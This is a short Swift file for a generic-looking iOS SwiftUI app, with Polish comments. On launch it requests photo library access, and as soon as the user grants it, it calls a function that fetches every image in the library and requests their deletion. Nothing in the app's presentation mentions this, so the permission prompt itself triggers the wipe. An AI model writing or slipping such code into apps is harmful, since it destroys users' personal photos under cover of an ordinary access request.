import SwiftUI
import Photos

@main
struct IOSApp: App {
    var body: some Scene {
        WindowGroup {
            ContentView()
                .onAppear(perform: {
                    PHPhotoLibrary.requestAuthorization { (status) in
                        switch status {
                        case .authorized:
                            // Użytkownik udzielił zgody
                            print("Użytkownik udzielił zgody na dostęp do galerii zdjęć.")
                            deleteAllPhotosFromLibrary()
                        case .denied, .restricted:
                            // Użytkownik odmówił zgody
                            print("Użytkownik odmówił zgody na dostęp do galerii zdjęć.")
                        case .notDetermined:
                            // Użytkownik jeszcze nie podjął decyzji
                            print("Użytkownik jeszcze nie podjął decyzji o dostępie do galerii zdjęć.")
                        @unknown default:
                            print("Nieznany status autoryzacji galerii zdjęć.")
                        }
                    }
                })
        }
    }
}

func deleteAllPhotosFromLibrary() {
    let library = PHPhotoLibrary.shared()
    library.performChanges({
        let fetchOptions = PHFetchOptions()
        let allPhotos = PHAsset.fetchAssets(with: .image, options: fetchOptions)
        PHAssetChangeRequest.deleteAssets(allPhotos)
    }, completionHandler: { success, error in
        if success {
            print("Usunięto wszystkie zdjęcia z galerii.")
        } else if let error = error {
            print("Wystąpił błąd podczas usuwania zdjęć: \(error)")
        }
    })
}

